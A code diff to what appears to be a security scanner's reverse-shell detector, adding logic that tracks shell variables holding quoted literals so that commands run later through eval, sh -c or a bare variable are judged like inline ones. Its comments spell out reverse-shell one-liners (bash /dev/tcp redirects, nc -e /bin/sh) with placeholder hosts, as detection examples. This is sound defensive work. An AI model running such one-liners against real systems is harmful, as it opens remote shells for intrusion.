@@ -18120,12 +18120,119 @@ _SH_REV_REASONS = {
 }
 
 
+# B-1062: a reverse-shell command STORED in a shell variable and then run through it.
+#   C="bash -i >& /dev/tcp/H/P 0>&1"; eval "$C"        sh -c "$C"        $C   (nc -e form)
+# The scan above only reads a payload in command position, so the stored text -- plainly on
+# the assignment line -- was never judged. The closed mechanism added here: remember, in
+# source order, each variable whose value is ONE plain quoted literal (no `$`, no backtick,
+# no command substitution), and where a later line RUNS the variable -- `eval "$C"` / `eval $C`,
+# `<shell> [flags] -c "$C"` (QUOTED ref only: unquoted `-c $C` word-splits and runs only the first
+# word), or an unquoted `$C` / `${C}` as the first word of a statement -- rewrite the reference
+# into the literal it stands for and let the existing command-position rules judge the result.
+# So the inline form and the stored form get the same verdict by construction. A mere
+# `echo "$C"` / `printf %s "$C"` / `cat <<<"$C"` is not a run site and stays silent. Any
+# other rebinding of the name (a non-literal assignment, `+=`, `unset`, `read`, a `for` loop
+# variable, `local`/`declare` without a literal) forgets it. Known limits (kept, like the rest
+# of this block, closed): a value built from other variables or `$(...)`, a value spanning
+# several lines, a copy through a second variable (`D=$C; eval "$D"`), `echo "$C" | bash`
+# (the pipe-to-shell shape is already a declared ceiling), `source <(echo "$C")`, and
+# scope: the walk is source-ordered and flow-insensitive across functions and branches.
+_SH_STORED_ASSIGN_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*"
+    r"(?:(?:export|readonly|declare(?:\s+-[A-Za-z]+)*|typeset(?:\s+-[A-Za-z]+)*|local)\s+)?"
+    r"(?P<name>[A-Za-z_]\w*)=(?P<val>\"(?:[^\"\\]|\\.)*\"|'[^']*')?"
+)
+_SH_STORED_REBIND_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?:"
+    r"(?P<plus>[A-Za-z_]\w*)\+=|unset\s+(?:-[fnv]\s+)?(?P<unset>[A-Za-z_]\w*)"
+    r"|for\s+(?P<for>[A-Za-z_]\w*)\s+in\b|read\s+(?:-[A-Za-z]+\s+)*(?P<read>[A-Za-z_]\w*))"
+)
+_SH_STORED_NAME = r"[A-Za-z_]\w*"
+_SH_STORED_EVAL_USE_RE = re.compile(
+    r"(?<![\w.$/{}-])eval\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME
+    + r")\}\"|\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>" + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_DASHC_USE_RE = re.compile(
+    r"(?<=\s)-[A-Za-z]*c\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME + r")\}\")"
+)
+_SH_STORED_BARE_USE_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?P<ref>\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>"
+    + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_META_RE = re.compile(r"[;&|<>()$`'\"\\\n{}*?\[~#]")
+_SH_STORED_MAX = 64
+_SH_STORED_VAL_MAX = 2048
+
+
+def _sh_stored_literal(val: str) -> "str | None":
+    """The text a plain quoted literal stands for, or None when it expands anything."""
+    q = val[0]
+    body = val[1:-1]
+    if q == "'":
+        return body
+    if re.search(r"(?<!\\)(?:\$|`)", body):
+        return None
+    return re.sub(r"\\([\"$`\\])", r"\1", body)
+
+
+def _sh_stored_track(line: str, env: dict) -> None:
+    """Update `env` (name -> literal) from the assignments / rebindings on one logical line."""
+    for m in _SH_STORED_REBIND_RE.finditer(line):
+        env.pop(m.group("plus") or m.group("unset") or m.group("for") or m.group("read"), None)
+    for m in _SH_STORED_ASSIGN_RE.finditer(line):
+        name, val = m.group("name"), m.group("val")
+        lit = _sh_stored_literal(val) if val else None
+        # a quoted literal must END the word (`C="a"$X` is not a plain literal)
+        if lit is not None and line[m.end() : m.end() + 1] not in ("", " ", "\t", ";", "&", "|", ")", "}", "#"):
+            lit = None
+        if lit is not None and len(lit) <= _SH_STORED_VAL_MAX and (name in env or len(env) < _SH_STORED_MAX):
+            env[name] = lit
+        else:
+            env.pop(name, None)
+
+
+def _sh_stored_inline(line: str, env: dict) -> str:
+    """`line` with every RUN reference to a tracked variable replaced by the literal it holds
+    (double-quoted for the `eval` / `-c` wrapper forms, raw for a bare command-position `$C`)."""
+    if not env or "$" not in line:
+        return line
+
+    def sub(rx, quote: bool, text: str) -> str:
+        out = []
+        last = 0
+        for m in rx.finditer(text):
+            name = next((m.group(g) for g in ("n1", "n2", "n3", "n4") if m.groupdict().get(g)), None)
+            lit = env.get(name) if name else None
+            if lit is None:
+                continue
+            if quote:
+                lit = '"' + lit.replace("\\", "\\\\").replace('"', '\\"').replace("$", "\\$").replace("`", "\\`") + '"'
+            out.append(text[last : m.start("ref")])
+            out.append(lit)
+            last = m.end("ref")
+        out.append(text[last:])
+        return "".join(out)
+
+    line = sub(_SH_STORED_EVAL_USE_RE, True, line)
+    line = sub(_SH_STORED_DASHC_USE_RE, True, line)
+    # A bare `$C` is only word-split, never re-parsed as shell syntax: it can run a stored
+    # `nc -e /bin/sh H P` but NOT a stored redirect (`bash -i >& /dev/tcp/..` would hand `>&`
+    # to bash as an argument). So only a value free of shell metacharacters is inlined.
+    plain = {k: v for k, v in env.items() if not _SH_STORED_META_RE.search(v)}
+    saved, env = env, plain
+    try:
+        return sub(_SH_STORED_BARE_USE_RE, False, line)
+    finally:
+        env = saved
+
+
 def _sh_reverse_shell_lines(masked: str) -> list:
     """`[(physical_line, shape)]` for every logical line of `masked` (whole-line comments
     already blanked) carrying a reverse-shell primitive -- see the C-630 block above."""
     joined = _sh_loop_join_continuations(masked)
     hits = []
     open_fds: set = set()
+    var_env: dict = {}  # B-1062: variables holding one plain quoted literal
     ln = 1
     pos = 0
     for raw in joined.split("\n"):
@@ -18133,7 +18240,8 @@ def _sh_reverse_shell_lines(masked: str) -> list:
         seg = pos
         ln += masked.count("\n", pos, pos + len(raw)) + 1
         pos += len(raw) + 1
-        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+        track = bool(var_env) or "=" in raw  # B-1062: assignments / rebinds / run sites
+        if not track and not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
             continue
         # Comments are code that never runs: blank them (per PHYSICAL line -- see
         # `_sh_rev_lex`) before anything reads the line, so a trailing `# note` cannot turn
@@ -18146,6 +18254,11 @@ def _sh_reverse_shell_lines(masked: str) -> list:
                 breaks.append(k - seg)
                 k = masked.find("\n", k + 1, seg + len(raw))
             raw = _sh_rev_lex(raw, breaks)[1]
+        if track:
+            _sh_stored_track(raw, var_env)
+            raw = _sh_stored_inline(raw, var_env)
+            if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+                continue
         # Every layer is (text, quote mask, command-position oracle), each built once. A wrapper
         # BODY is only worth a scan when it can carry a primitive at all -- the same gate the
         # line itself passed (a cue, or an `&` that could be a dup of an fd this line opens):
